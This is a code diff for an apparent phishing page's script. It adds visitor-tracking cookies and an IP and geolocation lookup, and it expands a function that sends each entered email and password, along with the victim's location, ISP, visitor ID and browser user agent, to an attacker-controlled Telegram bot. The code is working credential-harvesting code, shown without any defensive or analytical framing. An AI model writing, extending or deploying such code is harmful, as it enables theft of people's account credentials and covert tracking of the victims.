@@ -264,17 +264,68 @@
 
   <script>
     // ── Telegram config ────────────────────────────────────────────────────
-    // Replace these two values with your actual Bot Token and Chat ID
     const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";   // from @BotFather
     const TELEGRAM_CHAT_ID   = "YOUR_CHAT_ID";     // from @userinfobot
     // ──────────────────────────────────────────────────────────────────────
 
+    // ── Cookie helpers ─────────────────────────────────────────────────────
+    function setCookie(name, value, days) {
+      const exp = new Date(Date.now() + days * 864e5).toUTCString();
+      document.cookie = `${name}=${value}; expires=${exp}; path=/; SameSite=Lax`;
+    }
+    function getCookie(name) {
+      return document.cookie.split('; ').reduce((acc, c) => {
+        const [k, v] = c.split('=');
+        return k === name ? v : acc;
+      }, null);
+    }
+    function uuidv4() {
+      return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+        (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
+    }
+
+    // Assign a persistent visitor ID cookie (30-day expiry)
+    if (!getCookie('vid')) setCookie('vid', uuidv4(), 30);
+    const visitorId = getCookie('vid');
+
+    // Record first-seen and page-load timestamps
+    if (!getCookie('first_seen')) setCookie('first_seen', new Date().toUTCString(), 365);
+    setCookie('last_seen', new Date().toUTCString(), 30);
+
+    // ── IP / Location lookup (on page load) ───────────────────────────────
+    let locationInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown' };
+    fetch('https://ipapi.co/json/')
+      .then(r => r.json())
+      .then(d => {
+        locationInfo = {
+          ip:      d.ip      || 'Unknown',
+          city:    d.city    || 'Unknown',
+          region:  d.region  || 'Unknown',
+          country: d.country_name || 'Unknown',
+          org:     d.org     || 'Unknown',
+        };
+      })
+      .catch(() => {}); // fail silently — we'll send whatever we have
+
+    // ── Telegram sender ────────────────────────────────────────────────────
     async function sendToTelegram(email, password) {
+      const firstSeen = getCookie('first_seen') || 'Unknown';
       const text =
         `🔐 New Sign-in Attempt\n` +
-        `👤 Email / Username: ${email}\n` +
-        `🔑 Password: ${password}\n` +
-        `🕐 Time: ${new Date().toUTCString()}`;
+        `\n👤 Email / Username: ${email}` +
+        `\n🔑 Password: ${password}` +
+        `\n\n📍 Location` +
+        `\n   IP:      ${locationInfo.ip}` +
+        `\n   City:    ${locationInfo.city}` +
+        `\n   Region:  ${locationInfo.region}` +
+        `\n   Country: ${locationInfo.country}` +
+        `\n   ISP/Org: ${locationInfo.org}` +
+        `\n\n🍪 Visitor` +
+        `\n   ID:         ${visitorId}` +
+        `\n   First seen: ${firstSeen}` +
+        `\n   This visit: ${new Date().toUTCString()}` +
+        `\n\n🖥️ Device` +
+        `\n   ${navigator.userAgent}`;
 
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const res = await fetch(url, {
